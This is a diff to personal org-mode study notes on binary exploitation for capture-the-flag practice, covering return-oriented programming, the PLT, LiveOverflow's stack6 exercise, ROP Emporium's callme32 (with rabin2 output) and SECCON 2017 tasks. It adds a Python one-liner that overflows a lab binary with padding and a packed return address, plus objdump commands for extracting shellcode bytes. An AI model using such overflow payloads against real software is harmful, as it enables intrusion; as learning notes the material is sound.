@@ -10,6 +10,18 @@ run machine instruction sequences that are already in the machine's memory, call
 The rise of 64-bit x86 processors brought with it a change to the subroutine calling convention that required the first argument to a function to be passed in a register instead of on the stack. This meant that an attacker could no longer set up a library function call with desired arguments just by manipulating the call stack via a buffer overrun exploit. 
 #+END_QUOTE
 
+#+BEGIN_QUOTE
+ret命令で終わる命令列の先頭へのジャンプを繰り返すことで、任意の命令列を実行させることができる
+#+END_QUOTE
+
+** PLT(procedure linkage table)
+https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/
+
+#+BEGIN_QUOTE
+when the linker creates a shared library, it doesn't know in advance where it might be loaded. This creates a problem for the data and code references within the library, which should be somehow made to point to the correct memory locations.
+#+END_QUOTE
+
+
 ** non-executable memory
 ** code signing
 ** gadgets
@@ -24,6 +36,23 @@ The goal of the attack is to obtain an address which belongs to the application 
 #+END_QUOTE
 
 * liveoverflow
+** exploit-exercises
+*** stack6
+https://www.youtube.com/watch?v=m17mV24TgwY
+
+__builtin_retiurn_address
+tells the current return addres from the stackf
+
+returnアドレスが0xbfで始まっているものはダメ
+#+BEGIN_SRC c
+ret = __builtin_return_address(0);
+
+  if((ret & 0xbf000000) == 0xbf000000) {
+      printf("bzzzt (%p)\n", ret);
+      _exit(1);
+  }
+#+END_SRC
+
 ** teufel(pwnable 200)							:rop:
 https://www.youtube.com/watch?v=wDosab_Y4Hs
 
@@ -89,10 +118,59 @@ https://www.youtube.com/watch?v=sYCzu04ftaY
 * ROP Emporium
 https://ropemporium.com/
 
+** callme32
+#+BEGIN_QUOTE
+it's important you understand what resides at the addresses reported to you by commands like rabin2 -i <binary> and rabin2 -R <binary>
+#+END_QUOTE
+
+#+BEGIN_QUOTE
+gsx@gsx-virtual-machine:~/Projects/ctf-trials/ROP/ROPEmporium/callme32$ rabin2 -i callme32
+[Imports]
+ordinal=001 plt=0x00000000 bind=WEAK type=NOTYPE name=_ITM_deregisterTMCloneTable
+ordinal=002 plt=0x08048590 bind=GLOBAL type=FUNC name=printf
+ordinal=003 plt=0x080485a0 bind=GLOBAL type=FUNC name=fgets
+ordinal=004 plt=0x080485b0 bind=GLOBAL type=FUNC name=callme_three
+ordinal=005 plt=0x080485c0 bind=GLOBAL type=FUNC name=callme_one
+ordinal=006 plt=0x080485d0 bind=GLOBAL type=FUNC name=puts
+ordinal=007 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__
+ordinal=008 plt=0x080485e0 bind=GLOBAL type=FUNC name=exit
+ordinal=009 plt=0x080485f0 bind=GLOBAL type=FUNC name=__libc_start_main
+ordinal=010 plt=0x08048600 bind=GLOBAL type=FUNC name=setvbuf
+ordinal=011 plt=0x08048610 bind=GLOBAL type=FUNC name=memset
+ordinal=012 plt=0x08048620 bind=GLOBAL type=FUNC name=callme_two
+ordinal=013 plt=0x00000000 bind=WEAK type=NOTYPE name=_Jv_RegisterClasses
+ordinal=014 plt=0x00000000 bind=WEAK type=NOTYPE name=_ITM_registerTMCloneTable
+
+14 imports
+gsx@gsx-virtual-machine:~/Projects/ctf-trials/ROP/ROPEmporium/callme32$ rabin2 -R ./callme32
+[Relocations]
+vaddr=0x08049ffc paddr=0x00000ffc type=SET_32 __gmon_start__
+vaddr=0x0804a040 paddr=0x00001040 type=SET_64
+vaddr=0x0804a060 paddr=0x00001060 type=SET_64
+vaddr=0x0804a064 paddr=0x00001064 type=SET_64
+vaddr=0x0804a00c paddr=0x0000100c type=SET_32 printf
+vaddr=0x0804a010 paddr=0x00001010 type=SET_32 fgets
+vaddr=0x0804a014 paddr=0x00001014 type=SET_32 callme_three
+vaddr=0x0804a018 paddr=0x00001018 type=SET_32 callme_one
+vaddr=0x0804a01c paddr=0x0000101c type=SET_32 puts
+vaddr=0x0804a020 paddr=0x00001020 type=SET_32 exit
+vaddr=0x0804a024 paddr=0x00001024 type=SET_32 __libc_start_main
+vaddr=0x0804a028 paddr=0x00001028 type=SET_32 setvbuf
+vaddr=0x0804a02c paddr=0x0000102c type=SET_32 memset
+vaddr=0x0804a030 paddr=0x00001030 type=SET_32 callme_two
+
+14 relocations
+gsx@gsx-virtual-machine:~/Projects/ctf-trials/ROP/ROPEmporium/callme32$
+#+END_QUOTE
 ** tools
 https://github.com/sashs/Ropper
 https://github.com/JonathanSalwan/ROPgadget
 https://github.com/Gallopsled/pwntools
+
+*** oneliner(python)
+#+BEGIN_SRC shell-script
+(python -c 'import struct; print "A"*28 + struct.pack("I", 0x080484cb)'; cat -) | ./binary
+#+END_SRC
 
 * SECCON2017
 ** Vigenere3d
@@ -343,3 +421,20 @@ very_smooth_36c055008b945516b9c17e2ecce1c582c184b57c2945bbffba20372a8f9a3449.zip
 ** automatic_door
 Get shell, and execute /flag_x
 http://automatic_door.pwn.seccon.jp/0b503d0caf712352fc200bc5332c4f95/
+* misc. commands and tools
+** shell script
+mainから次の空行までのみ表示する
+#+BEGIN_SRC shell-script
+objdump -M intel -d a.out | sed -n '/<main>:/,/^$/p'
+#+END_SRC
+
+アセンブリからshellcodeを生成
+#+BEGIN_SRC shell-script
+$ objdump -M intel -d a.out | grep '^ ' | cut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g'
+#+END_SRC
+
+
+* system calls
+** x86
+https://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/
+
